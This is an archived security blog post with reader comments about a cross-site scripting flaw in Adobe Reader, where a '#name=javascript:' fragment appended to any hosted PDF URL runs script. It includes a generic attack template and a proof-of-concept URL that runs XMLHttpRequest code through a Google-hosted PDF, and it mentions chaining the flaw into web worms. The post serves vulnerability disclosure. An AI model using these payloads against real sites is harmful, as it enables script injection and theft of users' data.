<blockquote>
<p>So we have changed a lot of diapers last year. Simple things we do suddenly have become very dangerous and risky. If you think that user supplied Image files are safe, think again. There were <a href="/blog/myspace-quicktime-worm-follow-up">several attacks affecting social networks</a> and a couple of <a href="http://www.gnucitizen.org/topics/myspace-worms">very successful AJAX worms</a>, again affecting social networks, during the last year. However, it seams that we haven&#39;t really scratch the surface yet.</p>
</blockquote>
<p>Back in September 2006 David and I had a <a href="http://michaeldaw.org/md-hacks/backdooring-pdf-files/">small adventure with Adobe&#39;s PDF technology</a>. David made several issues with JavaScript for PDF publicly available and the findings were quite shocking for many people including us. Today, it seams that PDF documents can execute JavaScript code for no apparent reason by using the following template.</p>
<pre><code>http://**path/to/pdf/file.pdf**#**whatever_name_you_want**=javascript:**your_code_here**</code></pre><p>You must understand that the attacker doesn&#39;t need to have write access to the specified PDF document. In order to get an XSS vector working you need to have a PDF file hosted on the target and that&#39;s all about it. The rest is just a matter of your abilities and desires.</p>
<p>This <a href="http://www.disenchant.ch/blog/hacking-with-browser-plugins/34">finding was originally mentioned</a> by <a href="http://www.disenchant.ch/blog">Sven Vetsch</a>, on his blog. The attack vector was <a href="http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html">discovered by Stefano Di Paola and Giorgio Fedon</a>. This is a very good and quite interesting finding. Good work.</p>
<p><em>Just to show you the impact of this issue I prepared the following POC.</em></p>
<pre><code>[http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject(&#39;Msxml2.XMLHTTP&#39;); }catch(e){}   try{ return new ActiveXObject(&#39;Microsoft.XMLHTTP&#39;); }catch(e){}   try{ return new XMLHttpRequest(); }catch(e){}   return null;}var xhr = createXMLHttpRequest();xhr.onreadystatechange = function(){    if (xhr.readyState == 4)        alert(xhr.responseText);};xhr.open(&#39;GET&#39;, &#39;http://www.google.com&#39;, true);xhr.send(null);
](http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function createXMLHttpRequest(){   try{ return new ActiveXObject()</code></pre><p>When you open the PDF document, an XMLHttpRequest will be made to google.com and the front page source code will be displayed inside an alert box. Obviously, attackers can create a lot more dangerous scenario, where highly sensitive information is leaked leaving the user totally blind of what is going on.</p>
<p>This attack vector has several benefits that I must elaborate on. First of all, it is obvious that this is not a server side problem. This is totally client side and Web app owners cannot do much about it. The only solution is to have Adobe release a patch as soon as possible or just not to host PDF files at all. Obviously the second solution is highly unfeasible. This leave us with Adobe fixing the bug, but let&#39;s be honest with each other. Things won&#39;t get better. It is not that Adobe don&#39;t have good guys there or they are irresponsible. It is just the fact that not that many people update their PDF reader mainly because it usually requires a large chunk of data being downloaded and installed. The process is very slow and bulky and puts off even security-minded people.</p>
<p><em>Now we have a prove that every site on this planet is vulnerable to XSS (Cross-site scripting). This is definitely not nice. Unwillingly we have become solicitors of a very dangerous craft.</em></p>

Web worms can use Jeremiah's <a href="http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html" rel="nofollow">css history dump</a> and <a href="http://jeremiahgrossman.blogspot.com/2006/12/i-know-if-youre-logged-in-anywhere.html" rel="nofollow">login detection</a> hacks together with the <a href="http://www.gnucitizen.org/blog/google-search-api-worms" rel="nofollow">Google AJAX Search API hack</a> in order to create a massive WEB infection.

1) This issues ONLY effects the Windows platform.  Mac, Linux, etc. users are NOT effected.

2) We found this issue out ourselves during our own security/vulnerability testing of Acrobat and introduced a fix as part of Acrobat/Reader 8 for Windows.  As such, users of Acrobat/Reader 8 (regardless of browser) are NOT EFFECTED!

3) We already have patches prepared for earlier versions of Acrobat and will release those as soon as they are ready.  This will address those users who are unable/unwilling to upgrade to Acrobat/Reader 8.

We thank the community for their concern in identifying vulnerabilities in our products and hope that our having the issues already addressed in our current versions will serve to alleviate concerns and demonstrate our commitment to this area.

Here we have to use IE but only trusted sites are allowed to run any kind of Javascript, ActiveX control, etc.  Non trusted sites can't even open PDF files directly so ordinarily vulnerabilities don't affect us at all.

However this bug appears to allow an untrusted site to open a PDF from a trusted site and I can only assume that means it will run the code from the security context of the trusted site too.  That is a very serious concern for us.

My other concern is that Acrobat Reader is a nightmare to update, it's one of the worst programs we have for deploying updates, and I can see this being a popular attack vector because of it's widespread use and the problems updating it.

We'll get Acrobat updated on our computers today, but I wonder how long this vulnerability would have gone quietly unnanounced by Adobe...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">And now it's local - credits for the basic PoC go to RSnake.

I think that a place like a bank simply could not afford to let even one or two customers log in affected by a bug of this magnitude, per year. Granted, banks probably have unique IDs on all their forms and yada yada yada... But every exploit you allow is a piece of the puzzle for a nice combined exploit that crumbles your bones to dust in the advent of Murphy's Law.
